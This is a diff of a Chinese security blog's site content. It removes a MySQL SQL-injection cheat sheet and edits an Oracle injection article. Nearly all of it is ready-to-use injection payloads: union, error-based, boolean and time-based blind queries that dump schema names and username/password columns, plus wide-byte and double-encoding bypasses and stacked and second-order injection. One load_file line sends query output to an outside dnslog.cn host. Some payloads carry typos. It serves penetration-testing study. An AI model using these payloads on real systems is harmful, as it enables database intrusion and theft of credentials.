-<h3 id="3、数据库信息查询"><a href="#3、数据库信息查询" class="headerlink" title="3、数据库信息查询"></a>3、数据库信息查询</h3><table>
-<thead>
-<tr>
-<th align="left">操作</th>
-<th align="left">语句</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">查库名</td>
-<td align="left"><code>-1 union select 1,2,database()– a</code> 推荐 <br><code>-1 union select 1,2,(select group_concat(0x7e,(schema_name),0x7e) from information_schema.schemata)– a</code></td>
-</tr>
-<tr>
-<td align="left">查表名</td>
-<td align="left"><code>-1 union select 1,2,(select group_concat(0x7e,(table_name),0x7e) from information_schema.tables where table_schema=&#39;数据库名&#39;)– a</code></td>
-</tr>
-<tr>
-<td align="left">查字段</td>
-<td align="left"><code>-1 union select 1,2,(select group_concat(0x7e,(column_name),0x7e) from information_schema.columns where table_schema=&#39;数据库名&#39; and table_name=&#39;表名&#39;)– a</code></td>
-</tr>
-<tr>
-<td align="left">查数据</td>
-<td align="left"><code>-1 union select 1,2,(select group_concat(0x7e,(uname,0x7e,pwd),0x7e) from dede_cms.dede_tb)– a</code></td>
-</tr>
-</tbody></table>
-<p><strong>注意</strong>：</p>
-<p>1、union select查询列数要与前面列数相同</p>
-<p>2、concat()拼接多列结果，group_concat()拼接多行结果。</p>
-<p>如</p>
-<pre class="highlight"><span class="line">SELECT * FROM db_bbs.tb_user UNION SELECT 1,(SELECT group_concat(table_name,’|’)FROM information_schema.`TABLES` WHERE TABLES_schema=’db_bbs’;),3,4;</span><br></pre>
-
-<p>3、可将查询内容去掉引号，转成16进制形式（前面加上0x）</p>
-<p>4、查表时，建议使用database()，既能避免转义，还可以确定当前有效数据库</p>
-<p>即</p>
-<pre class="highlight"><span class="line">SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()</span><br></pre>
-
-
-
-<p><strong>数据库常用函数</strong></p>
-<table>
-<thead>
-<tr>
-<th align="left">函数</th>
-<th align="left">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">version()</td>
-<td align="left">数据库版本号</td>
-</tr>
-<tr>
-<td align="left">database()</td>
-<td align="left">当前数据库</td>
-</tr>
-<tr>
-<td align="left">user()</td>
-<td align="left">当前用户</td>
-</tr>
-<tr>
-<td align="left">current_user()</td>
-<td align="left">当前用户名</td>
-</tr>
-<tr>
-<td align="left">system_user()</td>
-<td align="left">系统用户名</td>
-</tr>
-<tr>
-<td align="left">@@datadir</td>
-<td align="left">数据库路径</td>
-</tr>
-<tr>
-<td align="left">@@version_compile_os</td>
-<td align="left">操作系统版本</td>
-</tr>
-</tbody></table>
-<table>
-<thead>
-<tr>
-<th align="left">常用函数</th>
-<th align="left">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">limit</td>
-<td align="left">限制查询数量，下标从0开始 limit 0,1 从0开始查两个</td>
-</tr>
-<tr>
-<td align="left">length()</td>
-<td align="left">计算数据长度</td>
-</tr>
-<tr>
-<td align="left">count()</td>
-<td align="left">计算数据行数</td>
-</tr>
-<tr>
-<td align="left">mid(str,1,30)</td>
-<td align="left">截取字符串，从1开始截取30位,紧跟要截取的部分，即数据库名、表名、字段名和数据名</td>
-</tr>
-<tr>
-<td align="left">substr(str,0,30)</td>
-<td align="left">0为截取初始位，包含整个查询语句</td>
-</tr>
-<tr>
-<td align="left">ascii()</td>
-<td align="left">转为ascii码</td>
-</tr>
-</tbody></table>
-<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="1、相关函数"><a href="#1、相关函数" class="headerlink" title="1、相关函数"></a>1、相关函数</h3><table>
-<thead>
-<tr>
-<th align="left">函数</th>
-<th align="left">语句</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">updatexml(arg1,arg2,arg3) <br>查询符合条件的数据 XPATH路径报错</td>
-<td align="left">and updatexml(1,concat(0x5e,(select user()),0x5e),1)  <br>mysql5.1.5及以上版本，输出有32位长度限制 0x5e为^的16进制编码，用于绕过斜杠转义，下同</td>
-</tr>
-<tr>
-<td align="left">extractvalue(arg1,arg2) <br>同上，两个参数 XPATH路径报错</td>
-<td align="left">and extractvalue(1,concat(0x5e,(select user()),0x5e))  <br>mysql5.1及以上版本,输出有32位长度限制</td>
-</tr>
-<tr>
-<td align="left">floor() <br>返回小于等于该值的最大整数（只返回整数部分） floor、count、group by函数冲突报错</td>
-<td align="left">and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)  <br>mysql5.0及以上版本，user()可变，其他固定</td>
-</tr>
-<tr>
-<td align="left">name_const(name,value) <br>产生一个结果集合列 列名重复报错</td>
-<td align="left">and select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))a  <br>mysql5.0及以下</td>
-</tr>
-<tr>
-<td align="left">exp() 以e为底的指数函数 整形溢出报错</td>
-<td align="left">and exp(~(select * from (select user()) a))  <br>mysql5.5.5及以上版本</td>
-</tr>
-<tr>
-<td align="left">几何函数报错（不满足要求就会报错） <br>geometrycollection() <br>multipoint() <br>polygon() <br>multipolygon() <br>linestring() <br>multilinestring()</td>
-<td align="left">and multipoint((select * from (select * from (select * from (select version())a)b)c))</td>
-</tr>
-</tbody></table>
-<h3 id="2、用法："><a href="#2、用法：" class="headerlink" title="2、用法："></a>2、用法：</h3><p>将对应user()等地方替换为要执行的sql语句即可</p>
-<table>
-<thead>
-<tr>
-<th align="left">操作</th>
-<th align="left">语句</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">查数据库名</td>
-<td align="left"><code>id=1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)</code> 推荐 <br>或 <br><code>id=1&#39; and updatexml(1,concat(0x7e,(select mid(group_concat(schema_name),1,30) from information_schema.schemata),0x7e),1)</code></td>
-</tr>
-<tr>
-<td align="left">查表名</td>
-<td align="left"><code>id=1&#39; and updatexml(1,concat(0x7e,(select mid(group_concat(table_name),1,30) from information_schema.tables where table_schema=&#39;数据库&#39;),0x7e),1)</code></td>
-</tr>
-<tr>
-<td align="left">查字段</td>
-<td align="left"><code>id=1&#39; and updatexml(1,concat(0x7e,(select mid(group_concat(column_name),1,30) from information_schema.columns where table_schema=&#39;数据库名&#39; and table_name=&#39;表名&#39;),0x7e),1)</code></td>
-</tr>
-<tr>
-<td align="left">查数据</td>
-<td align="left"><code>id=1&#39; and updatexml(1,concat(0x7e,(select mid(group_concat(username,0x7e,password),1,30) from &#39;数据库名&#39;.&#39;表名&#39;),0x7e),1)</code></td>
-</tr>
-</tbody></table>
-<h2 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h2><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>条件匹配时返回数据，不匹配时无显示。需要对数据进行猜解（用ascii码进行匹配）</p>
-<p>1、用法：</p>
-<p>ascii码二分法</p>
-<table>
-<thead>
-<tr>
-<th align="left">说明</th>
-<th align="left">语句</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">先判断数据长度或个数</td>
-<td align="left">and length((select database())) &gt; 64</td>
-</tr>
-<tr>
-<td align="left">然后进行二分法匹配</td>
-<td align="left">and ascii(mid((select database()),1,1)) &gt;64</td>
-</tr>
-</tbody></table>
-<p>2、语句（省略二分法，直接用=号）</p>
-<p>n均为前一句获取的长度值</p>
-<table>
-<thead>
-<tr>
-<th align="left">操作</th>
-<th align="left">语句</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">获取数据库长度</td>
-<td align="left"><code>and (length(database()))=8</code> <br>注意：判断长度不需要转ascii码</td>
-</tr>
-<tr>
-<td align="left">获取数据库名</td>
-<td align="left"><code>and ascii((select mid(database(),n,1)))=115 -- a</code></td>
-</tr>
-<tr>
-<td align="left">获取表长度</td>
-<td align="left"><code>and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=30 -- a</code></td>
-</tr>
-<tr>
-<td align="left">获取表名</td>
-<td align="left"><code>and ascii((select mid(group_conca(table_name),1,1) from information_schema.tables where table_schema=database()))=100 -- a</code></td>
-</tr>
-<tr>
-<td align="left">获取字段长度</td>
-<td align="left"><code>and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;表名&#39;))=30 -- a</code></td>
-</tr>
-<tr>
-<td align="left">获取字段名</td>
-<td align="left"><code>and ascii((select mid(group_concat(column_name),1,1) from information_schema.columns where table_schema=database() and table_name=&#39;表名&#39;))=30 -- a</code></td>
-</tr>
-<tr>
-<td align="left">获取数据长度</td>
-<td align="left"><code>and length((select group_concat(username) from database().&#39;表名&#39;))=30 -- a</code></td>
-</tr>
-<tr>
-<td align="left">获取数据</td>
-<td align="left"><code>and ascii((select mid((username,password),1,1) from database().&#39;表名&#39;))=30 -- a</code></td>
-</tr>
-</tbody></table>
-<h3 id="时间延时盲注"><a href="#时间延时盲注" class="headerlink" title="时间延时盲注"></a>时间延时盲注</h3><p>（单双引号页面无变化）</p>
-<p>基于sql盲注，为升级版本</p>
-<p>使用’”%判断时，页面无任何变化，尝试判断是否存在时间盲注</p>
-<p>1、判断：</p>
-<p><code>&#39; &quot; \</code></p>
-<p><code>&#39;and sleep(3) %23</code></p>
-<p><code>&#39; and sleep(3))%23</code></p>
-<p>…</p>
-<p>方法同判断截断字符</p>
-<p>2、用法：</p>
-<table>
-<thead>
-<tr>
-<th align="left">函数</th>
-<th align="left">语句</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">if</td>
-<td align="left">select if(arg1,arg2,arg3) <br>arg1：判断条件 <br>arg2：条件为真时执行的语句 <br>arg3：条件为假时执行的语句  <br>常用： <br>and select if((length(database())&gt;5),sleep(5),1) –a</td>
-</tr>
-<tr>
-<td align="left">case when</td>
-<td align="left">select case when arg1 then arg2 else arg3 end; <br>arg1：判断条件 <br>arg2：条件为真时执行的语句<br>arg3：条件为假时执行的语句  <br>常用： <br>and select case when ascci(mid(version(),1,1))&gt;64 then sleep(3) end – a</td>
-</tr>
-</tbody></table>
-<p>3、语句如下（省略二分法，直接用=号）</p>
-<table>
-<thead>
-<tr>
-<th align="left">操作</th>
-<th align="left">语句</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">获取数据库长度</td>
-<td align="left"><code>and if((length(database()))=8),sleep(3),1)</code> <br>注意：判断长度不需要转ascii码</td>
-</tr>
-<tr>
-<td align="left">获取数据库名</td>
-<td align="left"><code>and if((ascii((select mid(database(),1,1)))=115),sleep(3),1) – a</code></td>
-</tr>
-<tr>
-<td align="left">获取表长度</td>
-<td align="left"><code>and if((length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=30),sleep(3),1) -- a</code></td>
-</tr>
-<tr>
-<td align="left">获取表名</td>
-<td align="left"><code>and if((ascii((select mid(group_concat(table_name),1,1) from information_schema.tables where table_schema=database()))=100),sleep(3),1) -- a</code></td>
-</tr>
-<tr>
-<td align="left">获取字段长度</td>
-<td align="left"><code>and if((length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;表名&#39;))=30),sleep(3),1) -- a</code></td>
-</tr>
-<tr>
-<td align="left">获取字段名</td>
-<td align="left"><code>and if((ascii((select mid(goup_concat(column_name),1,1) from information_schema.columns where table_schema=database() and table_name=&#39;表名&#39;))=30),sleep(3),1) -- a</code></td>
-</tr>
-<tr>
-<td align="left">获取数据长度</td>
-<td align="left"><code>and if((length((select group_concat(username) from database().&#39;表名&#39;))=30),sleep(3),1) -- a</code></td>
-</tr>
-<tr>
-<td align="left">获取字段名</td>
-<td align="left"><code>and if((ascii((select mid(goup_concat(username),1,1) from database().&#39;表名&#39;))=30),sleep(3),1) -- a</code></td>
-</tr>
-</tbody></table>
-<p>注： sleep可用benchmark代替</p>
-<p><code>benchmark(arg1,arg2)</code></p>
-<p>arg1为执行次数，arg2为执行语句</p>
-<p>即执行多少次指定语句，返回执行事件，次数500万次起步，基于cpu质量，延时不稳定</p>
-<p>benchmark(5000000,md5(123)) 执行500万次MD5加密</p>
-<p>select if(判断语句,benchmark(5000000,md5(123)),1)</p>
-<h1 id="五、其他注入类型"><a href="#五、其他注入类型" class="headerlink" title="五、其他注入类型"></a>五、其他注入类型</h1><h2 id="1、请求头注入"><a href="#1、请求头注入" class="headerlink" title="1、请求头注入"></a>1、请求头注入</h2><table>
-<thead>
-<tr>
-<th align="left">类型</th>
-<th align="left">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">User-Agent</td>
-<td align="left">浏览器版本</td>
-</tr>
-<tr>
-<td align="left">X-Forwarded-For</td>
-<td align="left">获取HTTP请求端的真实IP</td>
-</tr>
-</tbody></table>
-<p>使用Header Editor工具修改请求头，在上述两个值后添加单双引号，保持开启状态即可</p>
-<p>注意，这里的sql语句大概率为insert，所以可用注入为：</p>
-<p>报错注入和bool盲注</p>
-<h3 id="2、内联注入"><a href="#2、内联注入" class="headerlink" title="2、内联注入"></a>2、内联注入</h3><p>留言板界面若是存在注入，可用补齐insert语句参数法，</p>
-<p>找到留言板的显示位，在显示位上进行sql注入。</p>
-<p>这里难点在于插入位数未知、插入类型限制未知，所以位数需要逐个尝试，内容留空。</p>
-<p>使用</p>
-<p>不用注释，用截断代替，然后使用多个and/or连接</p>
-<p>注：前面为true用and；前面为false用or</p>
-<p>1、<code>&#39;firefox&#39; and &#39;</code>补齐</p>
-<p>2、<code>&#39;firefox&#39; and payload and &#39;</code></p>
-<h3 id="3、宽字节注入"><a href="#3、宽字节注入" class="headerlink" title="3、宽字节注入"></a>3、宽字节注入</h3><p>（单双引号页面无变化）</p>
-<p>mysql语句执行时，现将数据转成16进制，再执行</p>
-<p>GBK为两字节编码方式，编码范围为8140-FEFE（81为页数，40位行列）</p>
-<p>ascii为单字节编码，编码范围为00-7F（斜杠的ascii码为5C）</p>
-<p>当字节数小于81时，会被认为是ascii编码，将转码成ascii码形式；</p>
-<p>当字节数在81-FE之间时，会被认为是gbk编码，会连同后一位一起以gbk形式编码。</p>
-<p>形如abcd（ab为ascii转码的数据，cd为gbk转码的数据）</p>
-<p>原本应解码成两个ascii数据（a、b）和一个gbk数据（cd）</p>
-<p>但是若b的数据大于81，则会被认为是gbk编码的数据，会和c一起解码，</p>
-<p>此时就解码成了两个ascii数据（a、d）和一个gbk编码数据（bc）</p>
-<p><strong>用法：</strong></p>
-<p>注意：通常出现在斜杠转义单双引号的网页</p>
-<p>利用：构造?id=1%df’即可</p>
-<p>%df可以为任何hex码在81-FE之间的数据</p>
-<p><strong>宽字节注入存在条件</strong></p>
-<p>PHP+Mysql+GBK</p>
-<p><strong>编码语句：</strong></p>
-<pre class="highlight"><span class="line">mysql_set_charset(&quot;gbk&quot;)</span><br><span class="line"></span><br><span class="line">mysql_query(&quot;set names gbk&quot;)</span><br></pre>
-
-<p>转义语句：</p>
-<pre class="highlight"><span class="line">addslashes(&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">mysql_real_escape_string(&#x27;&#x27;)</span><br></pre>
-
-<p>上述四条语句组合中，除了</p>
-<p><code>mysql_set_charset(&quot;gbk&quot;)+mysql_real_escape_string(&#39;&#39;)</code>组合，其他组合均存在宽字节注入</p>
-<h3 id="4、二次编码注入"><a href="#4、二次编码注入" class="headerlink" title="4、二次编码注入"></a>4、二次编码注入</h3><p>(单双引号页面无变化)</p>
-<p>注！先转义再解码造成注入，应先解码再转义</p>
-<table>
-<thead>
-<tr>
-<th align="left">正确流程</th>
-<th align="left">错误流程（二次编码注入）</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">php自动进行一次url解码 网站二次解码 转义单双引号进行防护 写入数据库</td>
-<td align="left">php自动解码 转义防护 网站二次解码 urldecode()、rawurldecode() 写入数据库</td>
-</tr>
-</tbody></table>
-<p>单引号二次url编码为：%2527</p>
-<p>双引号二次url编码为：%2522</p>
-<p>关键字二次编码：hex转码-前缀加%25（%的url编码）</p>
-<h3 id="5、堆叠注入"><a href="#5、堆叠注入" class="headerlink" title="5、堆叠注入"></a>5、堆叠注入</h3><p>前提：存在sql注入</p>
-<p>截断符后使用分号分割，后面注释，中间插入任意sql语句（多个语句用;分割）</p>
-<p>堆叠注入存在场景</p>
-<table>
-<thead>
-<tr>
-<th align="left">搭配</th>
-<th align="left">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">mssql+asp/php/jsp</td>
-<td align="left">堆叠注入</td>
-</tr>
-<tr>
-<td align="left">mysql+php</td>
-<td align="left"></td>
-</tr>
-<tr>
-<td align="left">mysql_connect()/mysql_query(“select $id”)</td>
-<td align="left">不能堆叠注入</td>
-</tr>
-<tr>
-<td align="left">mysqli_connect()/mysqli_query(“select $id”)</td>
-<td align="left">不能堆叠注入</td>
-</tr>
-<tr>
-<td align="left">mysqli_connect()/multi_query(“select $id”)</td>
-<td align="left">堆叠注入</td>
-</tr>
-<tr>
-<td align="left">new PDO()/bindvalue(“select ?”) execute($id)</td>
-<td align="left">不能注入</td>
-</tr>
-<tr>
-<td align="left">new PDO()/query(“select $id”)</td>
-<td align="left">堆叠注入</td>
-</tr>
-</tbody></table>
-<h3 id="6、二阶注入"><a href="#6、二阶注入" class="headerlink" title="6、二阶注入"></a>6、二阶注入</h3><p>存储在数据库汇总的数据，在使用时发生的注入</p>
-<p>在注册用户或者发表文章等写入数据库操作时，加入注入语句，被转义存入数据库</p>
-<p>当使用该数据时，被取出，这时注入语句生效</p>
-<p>注意：遇到限制是数字类型或者关键字拦截，可进行十六进制编码</p>
-<h3 id="7、其他："><a href="#7、其他：" class="headerlink" title="7、其他："></a>7、其他：</h3><p>文件上传时，可通过文件名进行sql注入</p>
-<h1 id="六、DNS外带"><a href="#六、DNS外带" class="headerlink" title="六、DNS外带"></a>六、DNS外带</h1><p><strong>前提：</strong></p>
-<p>Windows服务器，secure_file_priv为空（非NULL）</p>
-<p><strong>语句：</strong></p>
-<pre class="highlight"><span class="line">select load_file(concat(&quot;\\\\&quot;,version(),&quot;.1ndex.dnslog.cn\\x&quot;));</span><br></pre>
-
-<h1 id="七、sql注入防护-修复"><a href="#七、sql注入防护-修复" class="headerlink" title="七、sql注入防护/修复"></a>七、sql注入防护/修复</h1><table>
-<thead>
-<tr>
-<th align="left">修复</th>
-<th align="left">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">去掉单引号</td>
-<td align="left">现实场景常用单引号，去掉不合实际</td>
-</tr>
-<tr>
-<td align="left">转义单引号</td>
-<td align="left">对数字型无效（数字型不需要引号） 斜杠转义 addslashes()函数转义 php.ini配置文件转义（5.6以下版本开启magic_quotes_gpc = On）</td>
-</tr>
-<tr>
-<td align="left">强制类型转换</td>
-<td align="left">针对数字型 intval()</td>
-</tr>
-<tr>
-<td align="left">更改数据库连接方式</td>
-<td align="left">POD连接数据库将变量转换成字符串，再写入数据库，无法拼接</td>
-</tr>
-</tbody></table>
-]]></content>
-      <categories>
-        <category>Web渗透</category>
-      </categories>
-      <tags>
-        <tag>mysql</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Oracle注入</title>
     <url>/article/Oracle%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<p><strong>端口：1521</strong></p>
 <p><strong>使用</strong></p>
 <p>select * from dual; dual是oracle数据库中的虚拟表，用于占位查询</p>
-<p>注释：–</p>
+<p>注释：<code>--</code></p>
 <p>chr(126)为~，为分隔符</p>
 <p>utl_url.escape() url编码</p>
-<p>对限定条件编码，解决dns外带乱码问题</p>
+<p>对限定条件进行编码，解决dns外带乱码问题</p>
 <p>&lt;&gt;可替代not in，用于嵌套查询，但是可用limit代替</p>
 <h1 id="一、union联合注入"><a href="#一、union联合注入" class="headerlink" title="一、union联合注入"></a>一、union联合注入</h1><table>
 <thead>
@@ -3259,7 +3259,7 @@
 </tr>
 <tr>
 <td align="left">判断数据库类型</td>
-<td align="left">返回正常为oracle数据库 <br><code>and len(&#39;a&#39;) = 1</code> <br><br>长度函数 <br> <code>and exist(select * from dual) dual表</code><br><code>and (select count(*) from user_tables)&gt;0 --</code> <br><code>user_tables 系统表</code></td>
+<td align="left">返回正常为oracle数据库 <br><code>and len(&#39;a&#39;) = 1</code>         长度函数 <br><code>and exist(select * from dual)</code>       dual表<br><code>and (select count(*) from user_tables)&gt;0 --</code>     user_tables 系统表</td>
 </tr>
 <tr>
 <td align="left">判断列数</td>
@@ -3267,27 +3267,27 @@
 </tr>
 <tr>
 <td align="left">判断占位符</td>
-<td align="left">oracle数据库需要查询类型与表结构类型匹配，否则报错 使用时查询处一个数字型和一个字符型显示位即可，其余位用null占位<br>如： <br><code>union select 1,&#39;2&#39;,null,null from dual--</code></td>
+<td align="left">oracle数据库需要查询类型与表结构类型匹配，否则报错 使用时查询出一个数字型和一个字符型显示位即可，其余位用null占位<br>如： <br><code>union select 1,&#39;2&#39;,null,null from dual--</code></td>
 </tr>
 <tr>
 <td align="left">获取基本信息</td>
-<td align="left">获取数据库版本 <br><code>union select 1,(select banner from sys.v_$version where rownum=1),3,4 from dual--</code>  <br><br>获取数据路连接用户名 <br><code>union select 1,(select sys_context(&#39;USERENV&#39;,&#39;CURRENT_USER&#39;) from dual),3,4 from dual--</code> <br><br>或 <br><code>union select 1,(select user from dual),3,4 from dual--</code>  <br><br>获取日志文件绝对路径 <br><code>union select 1,(select instance_name from v$instance),3,4 from dual--</code></td>
+<td align="left">获取数据库版本 <br><code>union select 1,(select banner from sys.v_$version where rownum=1),3,4 from dual--</code>  <br><br>获取数据库连接用户名 <br><code>union select 1,(select sys_context(&#39;USERENV&#39;,&#39;CURRENT_USER&#39;) from dual),3,4 from dual--</code> <br><br>或 <br><code>union select 1,(select user from dual),3,4 from dual--</code>  <br><br>获取日志文件绝对路径 <br><code>union select 1,(select instance_name from v$instance),3,4 from dual--</code></td>
 </tr>
 <tr>
-<td align="left">查数据库名</td>
-<td align="left"><code>union select 1,cast(owner as varchar(4000)),3,4 from (select owner,rownum as limit from (select distinct(owner) from sys.all_tables)) where limit=1--</code></td>
+<td align="left">查用户</td>
+<td align="left"><code>union select 1,cast(owner as varchar(4000)),3,4 from (select owner,rownum as limit from (select distinct(owner) from sys.all_tables)) where limit=1--</code><br><br>rownum：隐藏的行号</td>
 </tr>
 <tr>
 <td align="left">查表名</td>
-<td align="left"><code>union select 1,cast(table_name as varchar(4000)),3,4 from (select table_name,rownum as limit from (select distinct(table_name) from user_tables)) where limit=1-- </code><br><br>或 <br><code>union select 1,cast(table_name as varchar(4000)),3,4 from (select table_name,rownum as limit from (select distinct(table_name) from all_tables where owner=&#39;库名&#39;)) where limit=1--</code></td>
+<td align="left"><code>union select 1,cast(table_name as varchar(4000)),3,4 from (select table_name,rownum as limit from (select distinct(table_name) from user_tables)) where limit=1-- </code><br><br>或 <br><code>union select 1,cast(table_name as varchar(4000)),3,4 from (select table_name,rownum as limit from (select distinct(table_name) from all_tables)) where limit=1--</code></td>
 </tr>
 <tr>
-<td align="left">查字段名</td>
+<td align="left">查列名</td>
 <td align="left"><code>union select 1,cast(column_name as varchar(4000)),3,4 from (select column_name,rownum as limit from (select distinct(column_name) from user_tab_columns where table_name=&#39;表名&#39;)) where limit=1--</code></td>
 </tr>
 <tr>
 <td align="left">查数据</td>
-<td align="left"><code>union select 1,cast(namepwd as varchar(4000)),3,4 from (select name,pwd,rownum as limit from (select * from 字段名)) where limit=1 --</code></td>
+<td align="left"><code>union select 1,cast(name,pwd as varchar(4000)),3,4 from (select name,pwd,rownum as limit from (select * from 列名)) where limit=1 --</code></td>
 </tr>
 </tbody></table>
 <h1 id="二、报错注入"><a href="#二、报错注入" class="headerlink" title="二、报错注入"></a>二、报错注入</h1><p><strong>常用报错函数</strong></p>
@@ -3340,15 +3340,15 @@
 <td align="left"><code>and(select dbms_xdb_version.checkin((select banner from sys.v_$version where rownum=1))from dual)is not null--</code></td>
 </tr>
 <tr>
-<td align="left">获取数据库名称（或当前用户名）</td>
+<td align="left">获取用户名</td>
 <td align="left"><code>and (select dbms_xdb_version.checkin((select user from dual))from dual)is not null-- </code><br><br>或<br><code>and (select dbms_xdb_version.checkin((select owner from (select owner,rownum as limit from (select distinct(owner) from sys.all_tables)) where limit=1)) from dual) is not null --</code></td>
 </tr>
 <tr>
 <td align="left">获取表名</td>
-<td align="left"><code>and (select dbms_xdb_version.checkin((select table_name from (select table_name,rownum as limit from (select distinct(table_name) from user_tables)) where limit=1)) from dual) is not null --</code> <br><br>或 <br><code>and (select dbms_xdb_version.checkin((select table_name from (select table_name,rownum as limit from (select distinct(table_name) from all_tables where onwer=&#39;库名&#39;)) where limit=1)) from dual) is not null --</code></td>
+<td align="left"><code>and (select dbms_xdb_version.checkin((select table_name from (select table_name,rownum as limit from (select distinct(table_name) from user_tables)) where limit=1)) from dual) is not null --</code></td>
 </tr>
 <tr>
-<td align="left">获取字段名</td>
+<td align="left">获取列名</td>
 <td align="left"><code>and (select dbms_xdb_version.checkin((select column_name from (select column_name,rownum as limit from (select distinct(column_name) from user_tab_columns where table_name=&#39;表名&#39;)) where limit=1)) from dual) is not null --</code></td>
 </tr>
 <tr>
@@ -3366,14 +3366,14 @@
 </thead>
 <tbody><tr>
 <td align="left">decode()</td>
-<td align="left">if(条件==值1)à返回翻译值1，否则返回默认值 <br>decode(条件,值1,翻译值1,值2,翻译值2,…值n,翻译值n,缺省值)</td>
+<td align="left">if(条件==值1)正确返回翻译值1，否则返回默认值 <br>decode(条件,值1,翻译值1,值2,翻译值2,…值n,翻译值n,缺省值)</td>
 </tr>
 <tr>
 <td align="left">instr()</td>
 <td align="left">返回发现指定的字符的位置 <br>instr(string1,string2)<br>instr(源字符串,目标字符串)</td>
 </tr>
 </tbody></table>
-<p>1、猜解法（获取长度把substr改为length即可）</p>
+<p>1、猜解法</p>
 <table>
 <thead>
 <tr>
@@ -3382,7 +3382,7 @@
 </tr>
 </thead>
 <tbody><tr>
-<td align="left">判断数据库名（用户名）</td>
+<td align="left">判断用户名</td>
 <td align="left"><code>and (select ascii(substr(user,1,1))from dual)&gt;1--</code> <br><br>或 <br><code>and (select ascii(substr((select owner from (select owner,rownum as limit from (select distinct(owner) from sys.all_tables)) where limit=1),1,1))from dual)&gt;1--</code></td>
 </tr>
 <tr>
@@ -3390,7 +3390,7 @@
 <td align="left"><code>and (select ascii(substr(table_name,1,1)) from user_tables where rownum=1)&gt;1--</code></td>
 </tr>
 <tr>
-<td align="left">判断字段名</td>
+<td align="left">判断列名</td>
 <td align="left"><code>and (select ascii(substr((select column_name from (select column_name,rownum as limit from (select distinct(column_name) from user_tab_columns where table_name=&#39;表名&#39;)) where limit=1),1,1))from dual)&gt;1--</code></td>
 </tr>
 <tr>
@@ -3407,20 +3407,20 @@
 </tr>
 </thead>
 <tbody><tr>
-<td align="left">判断数据库名（用户名）</td>
-<td align="left"><code>and(select decode(substr(user,1,1),&#39;T&#39;,1,0)from dual)=1-- </code><br><br>或 <br><code>and(select decode(substr((select owner from (select owner,rownum as limit from (select distinct(owner) from sys.all_tables)) where limit=1),1,1),&#39;T&#39;,1,0)from dual)=1--</code></td>
+<td align="left">判断用户名</td>
+<td align="left"><code>and(select decode(substr(user,1,1),&#39;T&#39;,1,0)from dual)-- </code><br>T为猜解的字母<br>或 <br><code>and(select decode(substr((select owner from (select owner,rownum as limit from (select distinct(owner) from sys.all_tables)) where limit=1),1,1),&#39;T&#39;,1,0)from dual)--</code></td>
 </tr>
 <tr>
 <td align="left">判断表名</td>
-<td align="left"><code>and(select decode(substr((select table_name from (select table_name,rownum as limit from (select distinct(table_name) from user_tables)) where limit=1),1,1),&#39;T&#39;,1,0)from dual)=1–</code></td>
+<td align="left"><code>and(select decode(substr((select table_name from (select table_name,rownum as limit from (select distinct(table_name) from user_tables)) where limit=1),1,1),&#39;T&#39;,1,0)from dual)--</code></td>
 </tr>
 <tr>
 <td align="left">判断字段名</td>
-<td align="left"><code>and(select decode(substr((select column_name from (select column_name,rownum as limit from (select distinct(column_name) from user_tab_columns where table_name=&#39;表名&#39;)) where limit=1),1,1),&#39;T&#39;,1,0)from dual)=1--</code></td>
+<td align="left"><code>and(select decode(substr((select column_name from (select column_name,rownum as limit from (select distinct(column_name) from user_tab_columns where table_name=&#39;表名&#39;)) where limit=1),1,1),&#39;T&#39;,1,0)from dual)--</code></td>
 </tr>
 <tr>
 <td align="left">判断数据</td>
-<td align="left"><code>and(select decode(substr((select AGE from (select AGE,rownum as limit from (select * from 字段名)) where limit=1),1,1),&#39;T&#39;,1,0)from dual)=1--</code></td>
+<td align="left"><code>and(select decode(substr((select AGE from (select AGE,rownum as limit from (select * from 字段名)) where limit=1),1,1),&#39;T&#39;,1,0)from dual)--</code></td>
 </tr>
 </tbody></table>
 <p>3、instr</p>
@@ -3432,20 +3432,20 @@
 </tr>
 </thead>
 <tbody><tr>
-<td align="left">判断数据库名（用户名）</td>
-<td align="left"><code>and (instr((select user from dual),&#39;T&#39;))=1–</code> <br><br>或 <br><code>and(instr((select (select owner from (select owner,rownum as limit from (select distinct(owner) from sys.all_tables)) where limit=1) from dual),&#39;T&#39;))=1--</code></td>
+<td align="left">判断用户名</td>
+<td align="left"><code>and (instr((select user from dual),&#39;T&#39;))--</code> <br><br>或 <br><code>and(instr((select (select owner from (select owner,rownum as limit from (select distinct(owner) from sys.all_tables)) where limit=1) from dual),&#39;T&#39;))--</code></td>
 </tr>
 <tr>
 <td align="left">判断表名</td>
-<td align="left"><code>and (instr((select (select table_name from (select table_name,rownum as limit from (select distinct(table_name) from user_tables)) where limit=1) from dual),&#39;T&#39;))=1--</code></td>
+<td align="left"><code>and (instr((select (select table_name from (select table_name,rownum as limit from (select distinct(table_name) from user_tables)) where limit=1) from dual),&#39;T&#39;))--</code></td>
 </tr>
 <tr>
-<td align="left">判断字段名</td>
